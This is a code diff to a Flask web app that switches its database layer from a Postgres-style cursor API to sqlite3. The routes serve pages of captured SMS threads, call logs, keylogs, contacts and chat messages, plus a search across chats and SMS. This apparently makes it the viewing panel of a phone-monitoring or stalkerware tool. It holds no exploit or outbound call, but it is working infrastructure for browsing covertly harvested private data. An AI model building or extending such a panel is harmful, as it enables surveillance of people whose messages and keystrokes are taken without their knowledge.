@@ -68,15 +68,13 @@ def sms_thread(name):
         return "Database connection error", 500
     
     try:
-        with conn.cursor() as cur:
-            cur.execute(
-                'SELECT * FROM sms WHERE from_to = %s ORDER BY time DESC LIMIT 50',
-                (name,)
-            )
-            messages = cur.fetchall()
+        messages = conn.execute(
+            'SELECT * FROM SMS WHERE from_to = ? ORDER BY time DESC LIMIT 50',
+            (name,)
+        ).fetchall()
         conn.close()
         return render_template('sms.html', name=name, sms_messages=messages)
-    except Exception as e:
+    except sqlite3.Error as e:
         logger.error(f"Database error: {e}")
         return "Error fetching messages", 500
 
@@ -88,12 +86,10 @@ def calls():
         return "Database connection error", 500
     
     try:
-        with conn.cursor() as cur:
-            cur.execute('SELECT * FROM calls ORDER BY time DESC LIMIT 50')
-            call_logs = cur.fetchall()
+        call_logs = conn.execute('SELECT * FROM Calls ORDER BY time DESC LIMIT 50').fetchall()
         conn.close()
         return render_template('calls.html', call_logs=call_logs)
-    except Exception as e:
+    except sqlite3.Error as e:
         logger.error(f"Database error: {e}")
         return "Error fetching call logs", 500
 
@@ -105,12 +101,10 @@ def keylogs():
         return "Database connection error", 500
     
     try:
-        with conn.cursor() as cur:
-            cur.execute('SELECT * FROM keylogs ORDER BY time DESC LIMIT 50')
-            keylog_data = cur.fetchall()
+        keylog_data = conn.execute('SELECT * FROM Keylogs ORDER BY time DESC LIMIT 50').fetchall()
         conn.close()
         return render_template('keylogs.html', keylogs=keylog_data)
-    except Exception as e:
+    except sqlite3.Error as e:
         logger.error(f"Database error: {e}")
         return "Error fetching keylogs", 500
 
@@ -122,12 +116,10 @@ def contacts_list():
         return "Database connection error", 500
     
     try:
-        with conn.cursor() as cur:
-            cur.execute('SELECT * FROM contacts ORDER BY name')
-            contact_data = cur.fetchall()
+        contact_data = conn.execute('SELECT * FROM Contacts ORDER BY name').fetchall()
         conn.close()
         return render_template('contacts.html', contacts=contact_data)
-    except Exception as e:
+    except sqlite3.Error as e:
         logger.error(f"Database error: {e}")
         return "Error fetching contacts", 500
 
@@ -143,27 +135,24 @@ def search():
         return jsonify({'error': 'Database connection error'}), 500
 
     try:
-        with conn.cursor() as cur:
-            cur.execute('''
-                SELECT 'chat' as type, sender as name, text, time 
-                FROM chat_messages 
-                WHERE text LIKE %s 
-                ORDER BY time DESC LIMIT 25
-            ''', ('%' + search_term + '%',))
-            chat_results = cur.fetchall()
+        chat_results = conn.execute('''
+            SELECT 'chat' as type, sender as name, text, time 
+            FROM ChatMessages 
+            WHERE text LIKE ? 
+            ORDER BY time DESC LIMIT 25
+        ''', ('%' + search_term + '%',)).fetchall()
 
-            cur.execute('''
-                SELECT 'sms' as type, from_to as name, text, time 
-                FROM sms 
-                WHERE text LIKE %s 
-                ORDER BY time DESC LIMIT 25
-            ''', ('%' + search_term + '%',))
-            sms_results = cur.fetchall()
+        sms_results = conn.execute('''
+            SELECT 'sms' as type, from_to as name, text, time 
+            FROM SMS 
+            WHERE text LIKE ? 
+            ORDER BY time DESC LIMIT 25
+        ''', ('%' + search_term + '%',)).fetchall()
 
-        results = chat_results + sms_results
+        results = [dict(row) for row in (chat_results + sms_results)]
         conn.close()
         return jsonify(results)
-    except Exception as e:
+    except sqlite3.Error as e:
         logger.error(f"Search error: {e}")
         return jsonify({'error': 'Search failed'}), 500
 
